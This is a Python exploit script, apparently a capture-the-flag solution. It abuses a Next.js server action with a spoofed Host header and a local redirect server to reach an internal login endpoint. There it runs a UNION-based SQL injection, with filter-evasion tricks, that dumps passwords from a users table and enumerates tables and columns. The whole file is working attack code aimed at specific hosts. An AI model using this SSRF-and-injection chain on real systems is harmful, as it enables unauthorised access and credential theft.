import multiprocessing
import time
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler

for i in range(0x100):
    # username = f"a' union select table_name,1 from information_schema.tables where table_schema='test' limit {i},1;-- ".replace("or", "oorr")
    # username = f"a' union select column_name,1 from information_schema.columns where table_schema='test' and table_name='board' limit {i},1;-- ".replace("or", "oorr").replace("and", "aandnd")
    username = f"a' union select password,1 from users limit {i},1;-- ".replace("or", "oorr").replace("and", "aandnd")
    url = "http://192.168.200.120:808/login?key=392cc52f7a5418299a5eb22065bd1e5967c25341&username=" + username + "&password=a"

    class RedirectHandler(BaseHTTPRequestHandler):
        def do_HEAD(self):
            self.send_response(200)
            self.send_header('Content-Type', 'text/x-component')
            self.end_headers()
        def do_GET(self):
            self.send_response(302)
            self.send_header('Location', url)
            self.end_headers()
        def log_message(self, format, *args):
            return

    def run_server():
        httpd = HTTPServer(('', 1337), RedirectHandler)
        httpd.serve_forever()

    p = multiprocessing.Process(target=run_server)
    p.start()
    time.sleep(1)

    r = requests.post("http://3.38.141.72:3000", headers={
        "Host": "[SERVER]:1337",
        "Next-Action": "6e6feac6ad1fb92892925b4e3766928a754aec71",
        "Connection": "close"
    }, data="{}")

    print(r.text)

    p.terminate()
